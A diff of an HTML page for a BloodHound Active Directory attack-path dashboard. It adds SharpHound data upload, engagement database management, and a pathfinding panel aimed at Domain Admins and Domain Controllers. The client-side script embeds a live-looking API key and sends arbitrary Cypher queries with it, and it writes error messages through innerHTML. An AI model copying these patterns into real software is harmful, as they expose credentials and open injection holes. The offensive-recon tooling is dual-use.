@@ -5,36 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BloodHound Analysis - port254</title>
     <link rel="stylesheet" href="./css/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         /* Page-specific styles */
         .bloodhound-container {
             display: flex;
-            height: calc(100vh - 180px);
+            height: calc(100vh - 60px);
             overflow: hidden;
+            position: relative;
         }
 
         /* Sidebar */
         .bh-sidebar {
             width: 320px;
-            background: rgba(59, 130, 246, 0.05);
+            background: #000000;
             border-right: 1px solid #2a2a2a;
             display: flex;
             flex-direction: column;
             overflow: hidden;
+            position: fixed;
+            top: 166px;
+            left: 0;
+            bottom: 0;
+            z-index: 100;
         }
 
         .bh-sidebar-header {
-            padding: 1.25rem;
-            border-bottom: 1px solid #2a2a2a;
+            padding: 0.25rem 0.5rem 0.25rem 0.5rem;
+            border-bottom: none;
         }
 
         .bh-sidebar-title {
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: #60a5fa;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            margin-bottom: 0.75rem;
+            display: none;
         }
 
         .bh-search {
@@ -42,9 +46,9 @@
             background: #252525;
             border: 1px solid #3a3a3a;
             border-radius: 0.375rem;
-            padding: 0.5rem 0.75rem;
+            padding: 0.4rem 0.6rem;
             color: #f3f4f6;
-            font-size: 0.875rem;
+            font-size: 0.75rem;
         }
 
         .bh-search:focus {
@@ -55,29 +59,33 @@
         .bh-sidebar-content {
             flex: 1;
             overflow-y: auto;
-            padding: 0.5rem;
+            padding: 0rem 0.5rem;
         }
 
         .query-category {
-            margin-bottom: 1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .query-category:first-child {
+            margin-top: 0;
         }
 
         .category-title {
-            font-size: 0.7rem;
+            font-size: 0.75rem;
             font-weight: 700;
-            color: #9ca3af;
+            color: #60a5fa;
             text-transform: uppercase;
             letter-spacing: 0.1em;
-            padding: 0.5rem 0.75rem;
+            padding: 0.25rem 0.5rem;
             margin: 0;
         }
 
         .query-item {
-            padding: 0.625rem 0.75rem;
+            padding: 0.25rem 0.5rem;
             margin: 0.125rem 0;
             cursor: pointer;
             border-radius: 0.375rem;
-            font-size: 0.875rem;
+            font-size: 0.75rem;
             color: #d1d5db;
             transition: all 0.15s;
             border-left: 3px solid transparent;
@@ -99,7 +107,24 @@
         /* Main Content */
         .bh-main {
             flex: 1;
+            overflow: hidden;
+            background: #0f0f0f;
+            display: flex;
+            margin-left: 320px;
+        }
+
+        .bh-queries-panel {
+            width: 45%;
+            border-right: 2px solid #1a1a1a;
             overflow-y: auto;
+            padding: 2rem;
+            background: #0f0f0f;
+        }
+
+        .bh-results-panel {
+            width: 55%;
+            overflow-y: auto;
+            padding: 2rem;
             background: #0f0f0f;
         }
 
@@ -118,6 +143,7 @@
             font-weight: 600;
             color: #f3f4f6;
             margin-bottom: 0.5rem;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
         }
 
         .content-badge {
@@ -130,29 +156,31 @@
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.05em;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
         }
 
         .info-banner {
             background: rgba(59, 130, 246, 0.1);
-            border: 1px solid rgba(59, 130, 246, 0.3);
+            border: 1px solid #60a5fa;
             border-radius: 0.5rem;
             padding: 1rem;
             margin: 1.5rem 0;
             color: #d1d5db;
             font-size: 0.875rem;
             line-height: 1.6;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
         }
 
         .sharphound-section {
-            background: rgba(16, 185, 129, 0.05);
-            border: 1px solid rgba(16, 185, 129, 0.3);
+            background: #000000;
+            border: 1px solid #60a5fa;
             border-radius: 0.5rem;
             padding: 1.5rem;
             margin: 1.5rem 0;
         }
 
         .sharphound-section h3 {
-            color: #10b981;
+            color: #60a5fa;
             font-size: 1rem;
             margin: 0 0 1rem 0;
             font-weight: 600;
@@ -164,9 +192,9 @@
             border-radius: 0.375rem;
             padding: 1rem;
             margin: 0.75rem 0;
-            font-family: 'Courier New', monospace;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
             font-size: 0.8rem;
-            color: #10b981;
+            color: #60a5fa;
             overflow-x: auto;
             position: relative;
         }
@@ -181,10 +209,10 @@
         }
 
         .code-block {
-            background: #0a0a0a;
+            background: #000000;
             border: 1px solid #2a2a2a;
             border-radius: 0.5rem;
-            padding: 1.5rem;
+            padding: 1rem;
             margin: 1.5rem 0;
             position: relative;
         }
@@ -241,16 +269,16 @@
         }
 
         .code-content {
-            font-family: 'Courier New', monospace;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
             font-size: 0.875rem;
-            color: #10b981;
+            color: #60a5fa;
             line-height: 1.6;
-            overflow-x: auto;
-            white-space: pre;
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
 
         .results-section {
-            margin-top: 2rem;
+            margin-top: 0;
         }
 
         .results-header {
@@ -260,6 +288,7 @@
             text-transform: uppercase;
             letter-spacing: 0.1em;
             margin-bottom: 1rem;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
         }
 
         .results-table {
@@ -278,20 +307,22 @@
         .results-table th {
             background: #1a1a1a;
             color: #9ca3af;
-            font-size: 0.75rem;
+            font-size: 0.6875rem;
             font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            padding: 0.75rem 1rem;
+            padding: 0.5rem 0.75rem;
             text-align: left;
             border-bottom: 1px solid #2a2a2a;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
         }
 
         .results-table td {
-            padding: 0.75rem 1rem;
-            font-size: 0.875rem;
+            padding: 0.5rem 0.75rem;
+            font-size: 0.75rem;
             color: #d1d5db;
-            border-bottom: 1px solid #1a1a1a;
+            /* border-bottom: 1px solid #1a1a1a; */
+            line-height: 0.5;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+            text-transform: lowercase;
         }
 
         .results-table tr:hover {
@@ -319,39 +350,47 @@
             margin: 1rem 0;
             color: #fca5a5;
             font-size: 0.875rem;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
         }
 
         .success-banner {
-            background: rgba(16, 185, 129, 0.1);
-            border: 1px solid rgba(16, 185, 129, 0.3);
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid #60a5fa;
             border-radius: 0.5rem;
             padding: 1rem;
             margin: 1rem 0;
-            color: #6ee7b7;
+            color: #60a5fa;
             font-size: 0.875rem;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
         }
 
         /* Scrollbar */
         .bh-sidebar-content::-webkit-scrollbar,
-        .bh-main::-webkit-scrollbar {
+        .bh-main::-webkit-scrollbar,
+        .bh-queries-panel::-webkit-scrollbar,
+        .bh-results-panel::-webkit-scrollbar {
             width: 6px;
         }
 
         .bh-sidebar-content::-webkit-scrollbar-track,
-        .bh-main::-webkit-scrollbar-track {
+        .bh-main::-webkit-scrollbar-track,
+        .bh-queries-panel::-webkit-scrollbar-track,
+        .bh-results-panel::-webkit-scrollbar-track {
             background: #1a1a1a;
         }
 
         .bh-sidebar-content::-webkit-scrollbar-thumb,
-        .bh-main::-webkit-scrollbar-thumb {
+        .bh-main::-webkit-scrollbar-thumb,
+        .bh-queries-panel::-webkit-scrollbar-thumb,
+        .bh-results-panel::-webkit-scrollbar-thumb {
             background: #3a3a3a;
             border-radius: 3px;
         }
 
         .upload-section {
-            background: rgba(96, 165, 250, 0.05);
-            border: 2px dashed #3a3a3a;
-            border-radius: 0.5rem;
+            /* background: rgba(96, 165, 250, 0.05); */
+            /* border: 2px dashed #3a3a3a; */
+            /* border-radius: 0.5rem; */
             padding: 1.5rem;
             margin: 1.5rem 0;
             text-align: center;
@@ -378,6 +417,24 @@
         .upload-link:hover {
             text-decoration: underline;
         }
+
+        /* Abuse information code styling */
+        code {
+            background: #1a1a1a;
+            color: #10b981;
+            padding: 0.125rem 0.375rem;
+            border-radius: 0.25rem;
+            font-family: 'JetBrains Mono', 'Courier New', Courier, monospace;
+            font-size: 0.75rem;
+            display: inline-block;
+            margin: 0.125rem 0;
+            border: 1px solid #2a2a2a;
+        }
+
+        strong {
+            color: #60a5fa;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
@@ -400,11 +457,582 @@
                 <a href="file-analysis.html" class="nav-link">File Analysis</a>
                 <a href="incident-response.html" class="nav-link">Incident Response</a>
                 <a href="bloodhound.html" class="nav-link active">BloodHound</a>
+                <a href="documentation.html" class="nav-link">Documentation</a>
+                <a href="contact.html" class="nav-link">Contact</a>
             </nav>
         </div>
     </div>
 
+    <!-- Disclaimer -->
+    <div class="container" style="max-width: 1200px; margin: 1rem auto 0;">
+        <div style="background: rgba(59, 130, 246, 0.05); border: 1px solid rgba(96, 165, 250, 0.3); border-radius: 0.5rem; padding: 0.875rem 1rem;">
+            <p style="color: #9ca3af; font-size: 0.8125rem; margin: 0; line-height: 1.5;">
+                ⚠️ <strong style="color: #60a5fa;">Security Notice:</strong> Remove all sensitive information before uploading. Do not upload exam-related content or data from unauthorized assessments. All uploads are processed locally on your infrastructure.
+            </p>
+        </div>
+    </div>
+
     <!-- Main Container -->
+<!--
+Add this section to bloodhound.html BEFORE the existing query browser section
+This provides upload functionality and database selection
+-->
+
+<!-- Database Selector & Upload Section -->
+<div class="upload-section" style="margin-bottom: 1rem;">
+    <div class="container" style="max-width: 1200px; margin: 0 auto;">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
+
+            <!-- Left: Database Selector -->
+            <div class="database-selector" style="background: #1a1a1a; padding: 1rem; border-radius: 0.5rem; border: 1px solid #2a2a2a;">
+                <h3 style="color: #60a5fa; margin: 0 0 0.75rem 0; font-size: 0.9375rem; font-weight: 600;">
+                    Select Engagement
+                </h3>
+
+                <select id="database-selector" style="width: 100%; padding: 0.625rem; background: #252525; border: 1px solid #3a3a3a; color: #f3f4f6; border-radius: 0.375rem; font-size: 0.8125rem; margin-bottom: 0.625rem;">
+                    <option value="">Loading databases...</option>
+                </select>
+
+                <div style="display: flex; gap: 0.5rem;">
+                    <button onclick="refreshDatabases()" style="flex: 1; padding: 0.5rem; background: #252525; border: 1px solid #3a3a3a; color: #d1d5db; border-radius: 0.375rem; cursor: pointer; font-size: 0.75rem;">
+                        🔄 Refresh
+                    </button>
+
+                    <button onclick="deleteCurrentDatabase()" id="delete-db-btn" style="flex: 1; padding: 0.5rem; background: #3a0000; border: 1px solid #600; color: #ef4444; border-radius: 0.375rem; cursor: pointer; font-size: 0.75rem;" disabled>
+                        🗑️ Delete
+                    </button>
+                </div>
+
+                <div id="current-db-info" style="margin-top: 0.75rem; padding: 0.75rem; background: #252525; border-radius: 0.375rem; border-left: 2px solid #60a5fa; display: none;">
+                    <div style="color: #9ca3af; font-size: 0.75rem;">
+                        <strong style="color: #60a5fa; font-size: 0.8125rem;"><span id="current-db-name"></span></strong>
+                    </div>
+                    <div style="color: #6b7280; font-size: 0.6875rem; margin-top: 0.25rem;">
+                        <span id="current-db-stats"></span> • <span id="current-db-date"></span>
+                    </div>
+                    <div id="current-db-description" style="color: #6b7280; font-size: 0.6875rem; margin-top: 0.25rem; font-style: italic;"></div>
+                </div>
+            </div>
+
+            <!-- Right: Upload Zone -->
+            <div class="upload-zone" style="background: #1a1a1a; padding: 1rem; border-radius: 0.5rem; border: 1px solid #2a2a2a;">
+                <h3 style="color: #60a5fa; margin: 0 0 0.75rem 0; font-size: 0.9375rem; font-weight: 600;">
+                    Upload New Data
+                </h3>
+
+            <!-- Drag & Drop Area -->
+            <div id="drop-zone" style="border: 2px dashed #3a3a3a; border-radius: 0.5rem; padding: 1rem; text-align: center; background: #252525; cursor: pointer; transition: all 0.2s;">
+                <input type="file" id="file-input" accept=".zip" style="display: none;">
+
+                <div id="drop-zone-content">
+                    <div style="font-size: 1.5rem; margin-bottom: 0.5rem;">📦</div>
+                    <div style="color: #9ca3af; font-size: 0.8125rem; margin-bottom: 0.375rem;">
+                        Drop ZIP or click to browse
+                    </div>
+                    <div style="color: #6b7280; font-size: 0.6875rem;">
+                        v1.x/v2.x • Max 500MB
+                    </div>
+                </div>
+            </div>
+
+            <!-- Upload Form (appears after file selection) -->
+            <div id="upload-form" style="display: none; margin-top: 0.75rem;">
+                <div style="background: #252525; padding: 0.75rem; border-radius: 0.5rem; border: 1px solid #3a3a3a;">
+                    <div style="margin-bottom: 0.625rem;">
+                        <div id="selected-filename" style="color: #f3f4f6; font-size: 0.8125rem; font-weight: 500;"></div>
+                        <div id="selected-filesize" style="color: #6b7280; font-size: 0.6875rem; margin-top: 0.125rem;"></div>
+                    </div>
+
+                    <div style="margin-bottom: 0.625rem;">
+                        <input type="text" id="engagement-name" placeholder="Engagement Name *"
+                               style="width: 100%; padding: 0.5rem; background: #1a1a1a; border: 1px solid #3a3a3a; color: #f3f4f6; border-radius: 0.375rem; font-size: 0.75rem;">
+                    </div>
+
+                    <div style="margin-bottom: 0.75rem;">
+                        <textarea id="engagement-description" placeholder="Description (optional)" rows="2"
+                                  style="width: 100%; padding: 0.5rem; background: #1a1a1a; border: 1px solid #3a3a3a; color: #f3f4f6; border-radius: 0.375rem; font-size: 0.75rem; resize: vertical;"></textarea>
+                    </div>
+
+                    <div style="display: flex; gap: 0.5rem;">
+                        <button onclick="startUpload()" id="upload-btn" style="flex: 1; padding: 0.5rem; background: #3b82f6; border: none; color: #fff; border-radius: 0.375rem; cursor: pointer; font-size: 0.75rem; font-weight: 600;">
+                            Upload
+                        </button>
+                        <button onclick="cancelUpload()" style="padding: 0.5rem 0.75rem; background: #252525; border: 1px solid #3a3a3a; color: #9ca3af; border-radius: 0.375rem; cursor: pointer; font-size: 0.75rem;">
+                            Cancel
+                        </button>
+                    </div>
+
+                    <div id="upload-progress" style="display: none; margin-top: 0.625rem;">
+                        <div style="background: #1a1a1a; height: 0.375rem; border-radius: 0.25rem; overflow: hidden;">
+                            <div id="progress-bar" style="background: #3b82f6; height: 100%; width: 0%; transition: width 0.3s;"></div>
+                        </div>
+                        <div id="upload-status" style="color: #6b7280; font-size: 0.6875rem; margin-top: 0.25rem;">Uploading...</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Upload Results -->
+            <div id="upload-result" style="display: none; margin-top: 0.75rem;"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+/* Hover effects */
+#drop-zone:hover {
+    border-color: #60a5fa;
+    background: #2a2a2a;
+}
+
+#drop-zone.dragover {
+    border-color: #60a5fa;
+    background: #2a3a2a;
+    border-style: solid;
+}
+
+button:hover {
+    opacity: 0.8;
+}
+
+button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+}
+
+/* Animation for upload success */
+@keyframes slideIn {
+    from {
+        opacity: 0;
+        transform: translateY(-10px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.upload-success {
+    animation: slideIn 0.3s ease-out;
+}
+</style>
+
+<script>
+// Global variables
+let selectedFile = null;
+let currentDatabase = null;
+const API_BASE = 'https://bh254.duckdns.org:5443';
+const API_KEY = 'c5306776d50342efdf84e58e097e71eec2dea279edd87c5396b180fa5052e9a6';
+
+// Initialize on page load
+document.addEventListener('DOMContentLoaded', function() {
+    setupDropZone();
+    refreshDatabases();
+});
+
+// Setup drag & drop
+function setupDropZone() {
+    const dropZone = document.getElementById('drop-zone');
+    const fileInput = document.getElementById('file-input');
+
+    dropZone.addEventListener('click', () => fileInput.click());
+
+    dropZone.addEventListener('dragover', (e) => {
+        e.preventDefault();
+        dropZone.classList.add('dragover');
+    });
+
+    dropZone.addEventListener('dragleave', () => {
+        dropZone.classList.remove('dragover');
+    });
+
+    dropZone.addEventListener('drop', (e) => {
+        e.preventDefault();
+        dropZone.classList.remove('dragover');
+
+        const files = e.dataTransfer.files;
+        if (files.length > 0) {
+            handleFileSelect(files[0]);
+        }
+    });
+
+    fileInput.addEventListener('change', (e) => {
+        if (e.target.files.length > 0) {
+            handleFileSelect(e.target.files[0]);
+        }
+    });
+}
+
+function handleFileSelect(file) {
+    if (!file.name.endsWith('.zip')) {
+        showError('Please select a ZIP file');
+        return;
+    }
+
+    selectedFile = file;
+
+    // Show upload form
+    document.getElementById('drop-zone').style.display = 'none';
+    document.getElementById('upload-form').style.display = 'block';
+    document.getElementById('selected-filename').textContent = file.name;
+    document.getElementById('selected-filesize').textContent = formatFileSize(file.size);
+
+    // Try to auto-populate engagement name from filename
+    const nameParts = file.name.replace('.zip', '').split('_');
+    if (nameParts.length > 0) {
+        const autoName = nameParts[nameParts.length - 1].replace(/[^a-zA-Z0-9]/g, ' ').trim();
+        document.getElementById('engagement-name').value = autoName.toUpperCase();
+    }
+}
+
+function cancelUpload() {
+    selectedFile = null;
+    document.getElementById('drop-zone').style.display = 'block';
+    document.getElementById('upload-form').style.display = 'none';
+    document.getElementById('upload-result').style.display = 'none';
+    document.getElementById('file-input').value = '';
+    document.getElementById('engagement-name').value = '';
+    document.getElementById('engagement-description').value = '';
+}
+
+async function startUpload() {
+    const name = document.getElementById('engagement-name').value.trim();
+
+    if (!name) {
+        showError('Please enter an engagement name');
+        return;
+    }
+
+    if (!selectedFile) {
+        showError('No file selected');
+        return;
+    }
+
+    const description = document.getElementById('engagement-description').value.trim();
+
+    // Show progress
+    document.getElementById('upload-btn').disabled = true;
+    document.getElementById('upload-progress').style.display = 'block';
+    document.getElementById('upload-status').textContent = 'Uploading file...';
+
+    const formData = new FormData();
+    formData.append('file', selectedFile);
+    formData.append('name', name);
+    formData.append('description', description);
+
+    try {
+        const response = await fetch(`${API_BASE}/api/upload`, {
+            method: 'POST',
+            headers: {
+                'X-API-Key': API_KEY
+            },
+            body: formData
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+            showSuccess(result);
+            cancelUpload();
+            await refreshDatabases();
+
+            // Auto-select the newly uploaded database
+            document.getElementById('database-selector').value = result.id;
+            await switchDatabase();
+        } else {
+            showError(result.error || 'Upload failed');
+        }
+    } catch (error) {
+        showError(`Upload failed: ${error.message}`);
+    } finally {
+        document.getElementById('upload-btn').disabled = false;
+        document.getElementById('upload-progress').style.display = 'none';
+    }
+}
+
+async function refreshDatabases() {
+    try {
+        const response = await fetch(`${API_BASE}/api/databases`, {
+            headers: {
+                'X-API-Key': API_KEY
+            }
+        });
+
+        const data = await response.json();
+        const selector = document.getElementById('database-selector');
+
+        selector.innerHTML = '';
+
+        if (data.databases && data.databases.length > 0) {
+            // Add default option
+            const defaultOption = document.createElement('option');
+            defaultOption.value = '';
+            defaultOption.textContent = '-- Select a database --';
+            selector.appendChild(defaultOption);
+
+            data.databases.forEach(db => {
+                const option = document.createElement('option');
+                option.value = db.id;
+                option.textContent = `${db.engagement_name} (${new Date(db.uploaded_at).toLocaleDateString()})`;
+                option.dataset.database = JSON.stringify(db);
+                selector.appendChild(option);
+            });
+        } else {
+            selector.innerHTML = '<option value="">No databases available - Upload one above</option>';
+        }
+
+        // Restore previous selection if exists
+        if (currentDatabase) {
+            selector.value = currentDatabase.id;
+        } else {
+            selector.value = '';
+        }
+    } catch (error) {
+        console.error('Failed to load databases:', error);
+        document.getElementById('database-selector').innerHTML = '<option value="">Failed to load databases</option>';
+    }
+}
+
+async function switchDatabase() {
+    const selector = document.getElementById('database-selector');
+    const selectedOption = selector.options[selector.selectedIndex];
+
+    if (!selectedOption.dataset.database) {
+        document.getElementById('current-db-info').style.display = 'none';
+        document.getElementById('delete-db-btn').disabled = true;
+        currentDatabase = null;
+        return;
+    }
+
+    currentDatabase = JSON.parse(selectedOption.dataset.database);
+
+    // Update info panel
+    document.getElementById('current-db-name').textContent = currentDatabase.engagement_name;
+    document.getElementById('current-db-stats').textContent = formatStats(currentDatabase.stats);
+    document.getElementById('current-db-date').textContent = new Date(currentDatabase.uploaded_at).toLocaleString();
+    document.getElementById('current-db-description').textContent = currentDatabase.description || 'No description';
+    document.getElementById('current-db-info').style.display = 'block';
+    document.getElementById('delete-db-btn').disabled = false;
+
+    // Load users/computers for path finding
+    await loadPathNodes();
+
+    // Clear previous path results
+    document.getElementById('path-results').style.display = 'none';
+    document.getElementById('path-results').innerHTML = '';
+
+    // Refresh stats and queries with new database
+    await loadStats();
+}
+
+async function deleteCurrentDatabase() {
+    if (!currentDatabase) return;
+
+    if (!confirm(`Are you sure you want to delete "${currentDatabase.engagement_name}"?\n\nThis will permanently remove all data for this engagement.`)) {
+        return;
+    }
+
+    try {
+        const response = await fetch(`${API_BASE}/api/databases/${currentDatabase.id}`, {
+            method: 'DELETE',
+            headers: {
+                'X-API-Key': API_KEY
+            }
+        });
+
+        if (response.ok) {
+            showSuccess({ message: 'Database deleted successfully' });
+            currentDatabase = null;
+
+            // Hide the info panel
+            document.getElementById('current-db-info').style.display = 'none';
+            document.getElementById('delete-db-btn').disabled = true;
+
+            await refreshDatabases();
+        } else {
+            const error = await response.json();
+            showError(error.error || 'Failed to delete database');
+        }
+    } catch (error) {
+        showError(`Delete failed: ${error.message}`);
+    }
+}
+
+// Update existing query functions to use selected database
+async function runQuery(cypher) {
+    if (!currentDatabase) {
+        showError('Please select a database first');
+        return;
+    }
+
+    try {
+        // Inject engagement_id filter into query
+        const engagementId = currentDatabase.database_name;
+        const modifiedQuery = injectEngagementFilter(cypher, engagementId);
+
+        console.log('Original query:', cypher);
+        console.log('Modified query:', modifiedQuery);
+        console.log('Engagement ID:', engagementId);
+
+        const response = await fetch(`${API_BASE}/api/custom-query`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-API-Key': API_KEY
+            },
+            body: JSON.stringify({
+                query: modifiedQuery
+            })
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+            displayResults(data);
+        } else {
+            showError(data.error || 'Query failed');
+        }
+    } catch (error) {
+        showError(`Query failed: ${error.message}`);
+    }
+}
+
+function injectEngagementFilter(query, engagementId) {
+    // Add engagement_id filter to ALL node and relationship patterns throughout the query
+    const escapedId = engagementId.replace(/"/g, '\\"');
+
+    // Find all unique node variables in the query
+    const nodeVars = new Set();
+    // Match patterns like (u:User), (u:User {props}), (u {props}), (u)
+    const nodePattern = /\((\w+)(?::[\w]+)?(?:\s*\{[^}]*\})?\)/g;
+    let match;
+    while ((match = nodePattern.exec(query)) !== null) {
+        const varName = match[1];
+        // Skip if this looks like a function call
+        const beforeChar = match.index > 0 ? query[match.index - 1] : ' ';
+        // If preceded by letter (like "count(n)"), skip it
+        if (!/[a-zA-Z]/.test(beforeChar)) {
+            nodeVars.add(varName);
+            console.log('Found node variable:', varName, 'at position', match.index);
+        }
+    }
+
+    // Find all unique relationship variables in the query
+    const relVars = new Set();
+    // Match patterns like [r:Type], [r:Type {props}], [r {props}], [r]
+    // Note: [:Type] anonymous relationships won't be captured (that's okay)
+    const relPattern = /\[(\w+)(?::[\w]+)?(?:\s*\{[^}]*\})?\]/g;
+    while ((match = relPattern.exec(query)) !== null) {
+        const varName = match[1];
+        // Check if it's actually a variable (not just part of range like [*1..])
+        if (!/^\d+$/.test(varName) && varName !== '*') {
+            relVars.add(varName);
+            console.log('Found relationship variable:', varName, 'at position', match.index);
+        }
+    }
+
+    console.log('All node variables:', Array.from(nodeVars));
+    console.log('All relationship variables:', Array.from(relVars));
+
+    // Build WHERE clause
+    const conditions = [];
+    for (const varName of nodeVars) {
+        conditions.push(`${varName}.engagement_id = "${escapedId}"`);
+    }
+    for (const varName of relVars) {
+        conditions.push(`${varName}.engagement_id = "${escapedId}"`);
+    }
+
+    if (conditions.length === 0) {
+        console.warn('No variables found in query!');
+        return query; // No variables found, return original
+    }
+
+    console.log('WHERE conditions:', conditions);
+
+    // Insert WHERE clause after MATCH or append to existing WHERE
+    if (/\bWHERE\b/i.test(query)) {
+        // Already has WHERE, wrap existing conditions in parentheses and prepend engagement filters
+        // Use [\s\S]*? to match across newlines (compatible with all browsers)
+        query = query.replace(/\bWHERE\b\s+([\s\S]*?)(\bRETURN\b|\bWITH\b|\bORDER\b|\bLIMIT\b)/i,
+            (match, existingConditions, nextClause) => {
+                const trimmed = existingConditions.trim();
+                return `WHERE ${conditions.join(' AND ')} AND (${trimmed}) ${nextClause}`;
+            });
+    } else {
+        // No WHERE clause, add one after the last MATCH clause before RETURN/WITH
+        query = query.replace(/(\bMATCH\b[\s\S]*?)(\bRETURN\b|\bWITH\b)/i,
+            `$1 WHERE ${conditions.join(' AND ')} $2`);
+    }
+
+    console.log('Final modified query:', query);
+    return query;
+}
+
+async function loadStats() {
+    if (!currentDatabase) return;
+
+    try {
+        const response = await fetch(`${API_BASE}/api/stats?database=${currentDatabase.database_name}`, {
+            headers: {
+                'X-API-Key': API_KEY
+            }
+        });
+
+        const stats = await response.json();
+
+        // Update stats display in your existing dashboard
+        // (Adapt this to your existing stats display code)
+        console.log('Stats loaded:', stats);
+    } catch (error) {
+        console.error('Failed to load stats:', error);
+    }
+}
+
+// Utility functions
+function formatFileSize(bytes) {
+    if (bytes === 0) return '0 Bytes';
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+}
+
+function formatStats(stats) {
+    if (!stats) return 'No stats available';
+    return `${stats.users || 0} users, ${stats.computers || 0} computers, ${stats.groups || 0} groups`;
+}
+
+function showError(message) {
+    const resultDiv = document.getElementById('upload-result');
+    resultDiv.innerHTML = `
+        <div style="background: #4a0000; border: 1px solid #800; padding: 15px; border-radius: 4px; color: #ff6b6b;">
+            <strong>❌ Error:</strong> ${message}
+        </div>
+    `;
+    resultDiv.style.display = 'block';
+    setTimeout(() => resultDiv.style.display = 'none', 5000);
+}
+
+function showSuccess(result) {
+    const resultDiv = document.getElementById('upload-result');
+    resultDiv.innerHTML = `
+        <div class="upload-success" style="background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(96, 165, 250, 0.3); padding: 15px; border-radius: 4px; color: #60a5fa;">
+            <strong>✅ Upload Successful!</strong>
+            <div style="margin-top: 10px; color: #aaa; font-size: 13px;">
+                Database: ${result.database}<br>
+                Format: ${result.format}<br>
+                ${formatStats(result.stats)}
+            </div>
+        </div>
+    `;
+    resultDiv.style.display = 'block';
+    setTimeout(() => resultDiv.style.display = 'none', 8000);
+}
+
+// Attach event listener to database selector
+document.getElementById('database-selector').addEventListener('change', switchDatabase);
+</script>
     <div class="bloodhound-container">
         <!-- Sidebar -->
         <div class="bh-sidebar">
@@ -419,23 +1047,50 @@
 
         <!-- Main Content -->
         <div class="bh-main">
-            <div class="bh-content">
-                <div id="welcome-section">
-                    <div class="content-header">
-                        <h1 class="content-title">🩸 BloodHound Analysis</h1>
-                    </div>
+            <!-- Left Panel: Pathfinding -->
+            <div class="bh-queries-panel">
+                <div class="content-header" style="margin-bottom: 1.5rem;">
+                    <h1 class="content-title" style="font-size: 1.25rem; margin: 0;">🎯 Pathfinding</h1>
+                    <p style="color: #6b7280; font-size: 0.8125rem; margin: 0.5rem 0 0 0;">Find attack paths between nodes in your Active Directory environment</p>
+                </div>
 
-                    <div class="upload-section">
-                        <h3>Upload SharpHound Data</h3>
-                        <p>Upload your SharpHound collection to BloodHound CE to analyze Active Directory attack paths</p>
-                        <a href="http://192.168.1.7:8080/ui/login" target="_blank" class="upload-link">
-                            Open BloodHound CE UI →
-                        </a>
+                <!-- Interactive Path Query -->
+                <div class="code-block" style="margin-bottom: 1.5rem;">
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1rem;">
+                        <div>
+                            <label style="display: block; color: #9ca3af; font-size: 0.6875rem; margin-bottom: 0.5rem; text-transform: uppercase; letter-spacing: 0.05em; font-weight: 600; font-family: 'JetBrains Mono', 'Courier New', monospace;">From Node (optional)</label>
+                            <select id="path-from" style="width: 100%; padding: 0.625rem; background: #1a1a1a; border: 1px solid #3a3a3a; color: #f3f4f6; border-radius: 0.375rem; font-size: 0.75rem; font-family: 'JetBrains Mono', 'Courier New', monospace; text-transform: lowercase;">
+                                <option value="">-- Any / Not specified --</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label style="display: block; color: #9ca3af; font-size: 0.6875rem; margin-bottom: 0.5rem; text-transform: uppercase; letter-spacing: 0.05em; font-weight: 600; font-family: 'JetBrains Mono', 'Courier New', monospace;">To Node (optional)</label>
+                            <select id="path-to" style="width: 100%; padding: 0.625rem; background: #1a1a1a; border: 1px solid #3a3a3a; color: #f3f4f6; border-radius: 0.375rem; font-size: 0.75rem; font-family: 'JetBrains Mono', 'Courier New', monospace; text-transform: lowercase;">
+                                <option value="">-- Any / Not specified --</option>
+                                <optgroup label="High-Value Targets">
+                                    <option value="__DA__">🎯 Domain Admins Groups</option>
+                                    <option value="__DC__">💻 Domain Controllers</option>
+                                    <option value="__HVT__">⭐ High Value Targets</option>
+                                </optgroup>
+                            </select>
+                        </div>
+                    </div>
+                    <button onclick="runPathQuery()" style="padding: 0.625rem 1.5rem; background: #3b82f6; border: none; color: #fff; border-radius: 0.375rem; cursor: pointer; font-size: 0.8125rem; font-weight: 600; font-family: 'JetBrains Mono', 'Courier New', monospace; width: 100%;">
+                        🔍 Find Attack Paths
+                    </button>
+                </div>
+
+                <!-- Path Results -->
+                <div id="path-results" style="display: none;"></div>
+
+                <!-- SharpHound Commands Section -->
+                <div id="sharphound-section" style="margin-top: 2rem;">
+                    <div style="margin-bottom: 1rem;">
